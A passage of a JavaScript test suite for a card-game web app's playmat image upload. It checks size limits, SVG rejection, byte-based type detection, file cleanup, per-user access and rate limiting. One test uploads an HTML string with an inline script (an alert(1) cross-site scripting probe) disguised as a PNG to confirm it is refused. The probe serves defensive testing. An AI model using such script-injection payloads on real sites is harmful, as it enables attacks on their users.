    dbModule.db.prepare('INSERT INTO users (username, password_hash, role) VALUES (?, ?, ?)')
      .run(username, bcrypt.hashSync(password, 10), 'player');
  }

  // Upload as raw bytes with a declared content type. The type is deliberately
  // a parameter of the helper: several tests below are about it being ignored.
  function upload(cookie, bytes, contentType = 'application/octet-stream') {
    return request.post('/api/prefs/playmat')
      .set('Cookie', cookie)
      .set('Content-Type', contentType)
      .send(bytes);
  }

  // Everything in the playmat directory, so a test can assert an absence
  // without knowing how a filename is derived.
  function filesOnDisk() {
    try { return fs.readdirSync(playmats.dir).sort(); } catch { return []; }
  }

  beforeEach(() => {
    resetDb();
    addUser('alice', 'apw');
    addUser('bob',   'bpw');
    fs.rmSync(playmats.dir, { recursive: true, force: true });
    // The limiter counts by IP and every test here shares one, so its budget
    // has to be given back or the suite's own order would decide who is
    // throttled. The rate-limit test below is the only one that spends it.
    uploadLimiter.resetKey('::ffff:127.0.0.1');
    uploadLimiter.resetKey('127.0.0.1');
    uploadLimiter.resetKey('::1');
  });

  after(() => { fs.rmSync(playmats.dir, { recursive: true, force: true }); });

  test('a valid image is stored, recorded, and served back', async () => {
    const cookie = await loginAs('alice', 'apw');
    const res    = await upload(cookie, PNG, 'image/png');
    assert.equal(res.status, 200);
    assert.equal(res.body.playmatKind, 'upload');
    assert.equal(res.body.stored, true);
    assert.match(res.body.playmatUrl, /^\/playmat\/alice\?v=\d+$/);
    assert.equal(filesOnDisk().length, 1);

    // It survives the request that set it: a new session reads the same mat.
    const later = await request.get('/api/prefs').set('Cookie', await loginAs('alice', 'apw'));
    assert.equal(later.body.playmatUrl, res.body.playmatUrl);

    const img = await request.get(res.body.playmatUrl).set('Cookie', cookie);
    assert.equal(img.status, 200);
    assert.equal(img.headers['content-type'], 'image/png');
    assert.ok(Buffer.from(img.body).equals(PNG), 'the bytes served are the bytes uploaded');
  });

  test('JPEG and WebP are accepted too, and served as what they are', async () => {
    for (const [bytes, type] of [[JPEG, 'image/jpeg'], [WEBP, 'image/webp']]) {
      const cookie = await loginAs('alice', 'apw');
      const res    = await upload(cookie, bytes, type);
      assert.equal(res.status, 200, `${type} should be accepted`);
      const img = await request.get(res.body.playmatUrl).set('Cookie', cookie);
      assert.equal(img.headers['content-type'], type);
    }
  });

  test('an oversized file is rejected, and nothing is written', async () => {
    const cookie = await loginAs('alice', 'apw');
    // A real PNG header followed by six megabytes of it: the size check has to
    // come first, or this would be accepted as the image it claims to be.
    const huge = Buffer.concat([PNG, Buffer.alloc(6 * 1024 * 1024, 0x41)]);
    const res  = await upload(cookie, huge, 'image/png');
    assert.equal(res.status, 413);
    assert.match(res.body.error, /too large/i);
    assert.deepEqual(filesOnDisk(), [], 'nothing reaches disk before the size is known');
    assert.equal((await request.get('/api/prefs').set('Cookie', cookie)).body.playmatKind, 'none');
  });

  test('a vector image is rejected, whatever it calls itself', async () => {
    const cookie = await loginAs('alice', 'apw');
    for (const type of ['image/svg+xml', 'image/png', 'image/jpeg']) {
      const res = await upload(cookie, SVG, type);
      assert.equal(res.status, 415, `an SVG declared as ${type} is still an SVG`);
      assert.match(res.body.error, /SVG/);
    }
    assert.deepEqual(filesOnDisk(), []);
  });

  test('the declared type is never what decides — the bytes are', async () => {
    const cookie = await loginAs('alice', 'apw');

    // Bytes that are not an image, wearing an accepted content type.
    const notAnImage = Buffer.from('<!doctype html><script>alert(1)</script>');
    assert.equal((await upload(cookie, notAnImage, 'image/png')).status, 415);
    assert.deepEqual(filesOnDisk(), []);

    // And the same indifference the other way: a real PNG that lies about
    // itself is stored, and stored as the PNG it actually is.
    const res = await upload(cookie, PNG, 'image/svg+xml');
    assert.equal(res.status, 200);
    const img = await request.get(res.body.playmatUrl).set('Cookie', cookie);
    assert.equal(img.headers['content-type'], 'image/png');
  });

  test('a second upload replaces the first, and the old file is gone', async () => {
    const cookie = await loginAs('alice', 'apw');
    const first  = await upload(cookie, PNG, 'image/png');
    const before = filesOnDisk();
    assert.equal(before.length, 1);

    // A different format, so a replacement that only overwrote the same
    // filename would leave the first one behind.
    const second = await upload(cookie, JPEG, 'image/jpeg');
    assert.equal(second.status, 200);
    const after = filesOnDisk();
    assert.equal(after.length, 1, 'one playmat per person, on disk as well as in the row');
    assert.notDeepEqual(after, before);
    assert.notEqual(second.body.playmatUrl, first.body.playmatUrl,
      'the URL carries a version, so the replacement is not hidden behind a cached first');
    assert.equal((await request.get(first.body.playmatUrl).set('Cookie', cookie))
      .headers['content-type'], 'image/jpeg');
  });

  test('deleting the playmat removes both the preference and the file', async () => {
    const cookie = await loginAs('alice', 'apw');
    await upload(cookie, PNG, 'image/png');

    const del = await request.delete('/api/prefs/playmat').set('Cookie', cookie);
    assert.equal(del.status, 200);
    assert.equal(del.body.playmatKind, 'none');
    assert.equal(del.body.playmatUrl, null);
    assert.deepEqual(filesOnDisk(), []);
    assert.equal((await request.get('/api/prefs').set('Cookie', cookie)).body.playmatKind, 'none');
  });

  test('switching to a card playmat also takes the uploaded file with it', async () => {
    const cookie = await loginAs('alice', 'apw');
    await upload(cookie, PNG, 'image/png');
    const res = await request.put('/api/prefs').set('Cookie', cookie).send({
      playmatKind: 'scryfall', playmatRef: 'Underground Sea',
      playmatUrl: 'https://cards.scryfall.io/art_crop/front/x.jpg',
    });
    assert.equal(res.status, 200);
    assert.deepEqual(filesOnDisk(), [], 'the file a preference no longer points at is storage nobody can reach');
  });

  test('a client cannot claim an upload it never made', async () => {
    const cookie = await loginAs('alice', 'apw');
    const res = await request.put('/api/prefs').set('Cookie', cookie)
      .send({ playmatKind: 'upload', playmatUrl: '/playmat/bob' });
    assert.equal(res.status, 400);
  });

  test('deleting a user removes their playmat file', async () => {
    const cookie = await loginAs('alice', 'apw');
    await upload(cookie, PNG, 'image/png');
    assert.equal(filesOnDisk().length, 1);

    const adminCookie = await loginAs('admin', process.env.ADMIN_PASSWORD);
    assert.equal((await request.delete('/api/admin/users/alice').set('Cookie', adminCookie)).status, 200);
    assert.deepEqual(filesOnDisk(), [], 'deleting an account leaves nothing of the account behind');
  });

  test('the serving route requires authentication, and serves only your own', async () => {
    const aliceCookie = await loginAs('alice', 'apw');
    const { playmatUrl } = (await upload(aliceCookie, PNG, 'image/png')).body;

    // No session at all: 401, and not a redirect to the login page — a login
    // page returned in place of an image is a broken background.
    const anon = await request.get(playmatUrl);
    assert.equal(anon.status, 401);

    // A session, but somebody else's.
    const bobCookie = await loginAs('bob', 'bpw');
    assert.equal((await request.get(playmatUrl).set('Cookie', bobCookie)).status, 403);
    // And bob asking for his own, which does not exist, learns nothing about alice's.
    assert.equal((await request.get('/playmat/bob').set('Cookie', bobCookie)).status, 404);
  });

  test('the upload route is rate-limited', async () => {
    const cookie = await loginAs('alice', 'apw');
    const max    = Number(process.env.UPLOAD_RATE_LIMIT_MAX);
    for (let i = 0; i < max; i++) assert.equal((await upload(cookie, PNG, 'image/png')).status, 200);
    const over = await upload(cookie, PNG, 'image/png');
    assert.equal(over.status, 429);
    assert.match(over.body.error, /Too many/i);
  });
});

// ── Cleanup ────────────────────────────────────────────────────────────────────
after((_, done) => {
  const srv = getServer();
  function finish() {
    try { fs.rmSync(tmpDir, { recursive: true, force: true }); } catch {}
    done();
    // Force-exit: better-sqlite3 keeps event loop alive; tests are done.
    setImmediate(() => process.exit(0));
  }
  if (srv && srv.listening) {
    srv.close(finish);
  } else {
    finish();
  }
});
